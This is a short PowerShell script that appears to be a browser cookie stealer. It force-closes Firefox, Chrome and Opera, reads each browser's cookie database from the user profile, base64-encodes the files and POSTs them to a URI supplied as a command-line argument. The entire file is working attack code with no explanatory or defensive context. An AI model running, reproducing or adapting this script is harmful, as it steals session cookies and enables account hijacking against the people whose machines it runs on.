 $fire_p = Get-Process firefox -ErrorAction SilentlyContinue
if ($fire_p) {
  $fire_p.CloseMainWindow()
  Sleep 2
  if (!$fire_p.HasExited) {
    $fire_p | Stop-Process -Force
  }
}

$chrome_p = Get-Process chrome -ErrorAction SilentlyContinue
if ($chrome_p) {
  $chrome_p.CloseMainWindow()
  Sleep 2
  if (!$chrome_p.HasExited) {
    $chrome_p | Stop-Process -Force
  }
}

$opera_p = Get-Process opera -ErrorAction SilentlyContinue
if ($opera_p) {
  $opera_p.CloseMainWindow()
  Sleep 2
  if (!$opera_p.HasExited) {
    $opera_p | Stop-Process -Force
  }
}
$uri=$args[0];
$chrome="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
$base64chr=[Convert]::ToBase64String([IO.File]::ReadAllBytes($chrome));
$postparamschr="chr=$base64chr"
Invoke-RestMethod -Uri $uri -Method Post -Body $postparamschr

$moz=@(Get-ChildItem "$Env:USERPROFILE\AppData\\Roaming\Mozilla\Firefox\Profiles\" -Recurse -Force -Include *cookies.sqlite* -Name)
$moz_path="$Env:USERPROFILE\AppData\\Roaming\Mozilla\Firefox\Profiles\"
foreach ($f in $moz) {
$convert=$moz_path+$f
$base64file=[Convert]::ToBase64String([IO.File]::ReadAllBytes($convert));
$postparams="moz=$base64file"
Invoke-RestMethod -Uri $uri -Method Post -Body $postparams
}

$opera="$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Cookies"
$base64opr=[Convert]::ToBase64String([IO.File]::ReadAllBytes($opera));
$postparamsopr="opr=$base64opr"
Invoke-RestMethod -Uri $uri -Method Post -Body $postparamsopr
